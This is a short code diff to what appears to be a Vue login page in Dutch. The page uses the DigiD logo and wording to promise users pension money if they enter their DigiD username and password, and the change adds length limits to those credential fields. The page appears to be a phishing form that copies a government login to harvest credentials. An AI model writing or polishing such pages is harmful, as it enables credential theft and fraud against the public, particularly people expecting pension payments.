@@ -7,10 +7,10 @@
     Er staat {{ amount }} euro op je kaart. Login met Digid om je pensioen te ontvangen!
     <img src="../assets/digid.png">
       <md-field>
-        <md-input id="username" name="username" v-model="username" placeholder="Gebruikersnaam" />
+        <md-input id="username" name="username" v-model="username" placeholder="Gebruikersnaam" maxlength="20" />
       </md-field>
       <md-field>
-        <md-input id="password" name="password" type="password" v-model="password" placeholder="Wachtwoord" />
+        <md-input id="password" name="password" type="password" v-model="password" placeholder="Wachtwoord" maxlength="20" />
       </md-field>
       <md-button class="md-raised md-primary" @click="submit">Voeg to aan pensioen!</md-button>
     </md-card-content>
